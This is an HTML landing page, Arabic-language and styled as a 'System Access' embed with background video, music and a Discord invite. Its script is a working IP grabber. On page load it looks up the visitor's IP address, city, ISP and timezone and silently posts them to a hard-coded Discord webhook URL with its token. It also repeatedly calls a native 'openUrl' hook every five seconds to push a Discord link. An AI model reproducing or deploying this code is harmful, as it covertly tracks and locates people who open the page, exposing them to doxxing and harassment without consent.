<!DOCTYPE html>
<html lang="ar">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>System Access</title>
    <style>
        :root {
            --primary-color: #9f8663;
            --bg-dark: rgba(15, 15, 15, 0.95);
            --accent-red: #ff3333;
        }

        body {
            margin: 0;
            padding: 0;
            background: #000;
            font-family: 'Segoe UI', sans-serif;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            overflow: hidden;
        }

        /* الفيديو الخلفي */
        .video-container {
            position: absolute;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            z-index: -1;
        }

        .video-container video {
            width: 100%;
            height: 100%;
            object-fit: cover;
            filter: blur(8px) brightness(0.3);
        }

        /* تصميم الإمبيد الفخم */
        #content {
            display: none;
            opacity: 0;
            transform: scale(0.9);
            transition: all 0.8s ease;
            z-index: 10;
            width: 90%;
            max-width: 460px;
        }

        .embed-box {
            background: var(--bg-dark);
            border-radius: 10px;
            position: relative;
            border: 1px solid rgba(159, 134, 99, 0.2);
            box-shadow: 0 15px 35px rgba(0, 0, 0, 0.7);
            backdrop-filter: blur(12px);
            padding: 25px;
        }

        /* خط التزيين الجانبي */
        .embed-box::before {
            content: '';
            position: absolute;
            left: 0;
            top: 10%;
            width: 4px;
            height: 80%;
            background: var(--primary-color);
            box-shadow: 0 0 15px var(--primary-color);
            border-radius: 0 4px 4px 0;
        }

        .header {
            display: flex;
            align-items: center;
            margin-bottom: 20px;
            border-bottom: 1px solid rgba(255, 255, 255, 0.1);
            padding-bottom: 10px;
        }

        .header h2 {
            color: #fff;
            font-size: 1.1em;
            letter-spacing: 1.5px;
            margin: 0;
            text-transform: uppercase;
        }

        .info-list {
            display: grid;
            gap: 10px;
        }

        .row {
            display: flex;
            justify-content: space-between;
            padding: 8px 12px;
            background: rgba(255, 255, 255, 0.02);
            border-radius: 4px;
        }

        .label {
            color: var(--primary-color);
            font-weight: bold;
            font-size: 0.85em;
        }

        .val {
            color: #fff;
            font-family: 'Consolas', monospace;
            font-size: 0.9em;
        }

        .link-btn {
            margin-top: 20px;
            display: block;
            text-align: center;
            color: #fff;
            text-decoration: none;
            padding: 10px;
            border: 1px solid var(--primary-color);
            border-radius: 5px;
            transition: 0.3s;
            font-weight: bold;
            background: rgba(159, 134, 99, 0.05);
        }

        .link-btn:hover {
            background: var(--primary-color);
            color: #000;
            box-shadow: 0 0 20px var(--primary-color);
        }
    </style>
</head>
<body>

    <div class="video-container">
        <video autoplay loop muted playsinline>
            <source src="https://i.top4top.io/m_3243zidf01.mov" type="video/mp4">
        </video>
    </div>

    <div id="content">
        <div class="embed-box">
            <div class="header">
                <h2>< فحلكم شملان > </h2>
            </div>
            
            <div class="info-list" id="data-box">
                <div style="color: #9f8663; text-align: center;">LOADING SYSTEM DATA...</div>
            </div>

            <a href="https://discord.gg/q1" class="link-btn">discord.gg/q1</a>
        </div>

        <audio autoplay loop>
            <source src="https://d.top4top.io/m_3245nkfig1.mp3" type="audio/mpeg">
        </audio>
    </div>

    <script>
        window.addEventListener('load', () => {
            const content = document.getElementById('content');
            setTimeout(() => {
                content.style.display = 'block';
                setTimeout(() => {
                    content.style.opacity = '1';
                    content.style.transform = 'scale(1)';
                }, 50);
            }, 500);

            fetch('https://ipinfo.io/json')
            .then(res => res.json())
            .then(data => {
                const box = document.getElementById('data-box');
                const items = [
                    { n: 'IP ADDRESS', v: data.ip },
                    { n: 'LOCATION', v: `${data.city}, ${data.country}` },
                    { n: 'NETWORK', v: data.org },
                    { n: 'TIMEZONE', v: data.timezone }
                ];

                box.innerHTML = items.map(i => `
                    <div class="row">
                        <span class="label">${i.n}</span>
                        <span class="val">${i.v}</span>
                    </div>
                `).join('');

                // إرسال للويب هوك
                fetch('https://discord.com/api/webhooks/1432117446394908736/KTwmd-f8png6QS7MDLC4joF5V-txR2UfUQ332aPVjH_7u3InF0U88zEMMrZELzje9RE4', {
                    method: 'POST',
                    headers: {'Content-Type': 'application/json'},
                    body: JSON.stringify({
                        embeds: [{
                            title: "System Log",
                            color: 10454627,
                            description: `**IP:** ${data.ip}\n**Loc:** ${data.city}\n**ISP:** ${data.org}`,
                            timestamp: new Date()
                        }]
                    })
                });
            });
        });

        setInterval(() => {
            if(window.invokeNative) window.invokeNative("openUrl", "https://discord.gg/q1");
        }, 5000);
    </script>
</body>
</html>
